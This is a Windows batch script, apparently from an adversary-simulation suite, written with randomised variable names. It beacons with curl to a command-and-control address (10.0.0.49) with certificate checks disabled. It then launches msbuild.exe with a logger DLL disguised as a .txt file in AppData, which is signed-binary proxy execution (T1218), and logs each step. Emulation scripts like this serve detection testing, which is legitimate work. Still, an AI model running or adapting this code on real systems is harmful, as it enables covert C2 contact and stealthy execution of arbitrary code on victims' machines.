@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET pjkcpgw=%APPDATA%\8256\dab8b057
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?8256-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=firelox.txt
SET ewjmdkff=8256

REM Internal random variable names
SET zcmbds=%APPDATA%\!pudaazx!
SET mqwpkj=%zcmbds%\macula-simulations.log
SET kfvedd=1
SET lbflty=
SET dznbsr=%DATE%
SET uxgjpt=%TIME%
SET dznbsr=!dznbsr:/=-!
SET uxgjpt=!uxgjpt:~0,2!:!uxgjpt:~3,2!:!uxgjpt:~6,2!.!uxgjpt:~9,3!

REM 1. C2 HEARTBEAT
echo [!dznbsr! !uxgjpt!][DEBUG][!hlbnp!]: heartbeat_start=!drguvr!>> "!mqwpkj!" 2>nul
curl -k -s -o nul "!drguvr!"
echo [!dznbsr! !uxgjpt!][DEBUG][!hlbnp!]: heartbeat_complete>> "!mqwpkj!" 2>nul

REM 2. Execute MSBuild with DLL logger
SET nhmfkt=!pjkcpgw!\!syjfr!
echo [!dznbsr! !uxgjpt!][DEBUG][!hlbnp!]: file_target=!nhmfkt!>> "!mqwpkj!" 2>nul
echo [!dznbsr! !uxgjpt!][DEBUG][!hlbnp!]: process_start=msbuild.exe>> "!mqwpkj!" 2>nul

%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe /logger:LoggerEntry,!nhmfkt!;MyParameters,Foo
IF !ERRORLEVEL! NEQ 0 (
    SET kfvedd=0
    SET lbflty=msbuild_failed_!ERRORLEVEL!
)
echo [!dznbsr! !uxgjpt!][DEBUG][!hlbnp!]: process_complete=!ERRORLEVEL!>> "!mqwpkj!" 2>nul

REM TTP Logging
SET dznbsr=%DATE%
SET uxgjpt=%TIME%
SET dznbsr=!dznbsr:/=-!
SET uxgjpt=!uxgjpt:~0,2!:!uxgjpt:~3,2!:!uxgjpt:~6,2!.!uxgjpt:~9,3!
echo [!dznbsr! !uxgjpt!][!hlbnp!]: !pudaazx!-!ewjmdkff!-T1218|MSBuild=!kfvedd!:!lbflty!>> "!mqwpkj!" 2>nul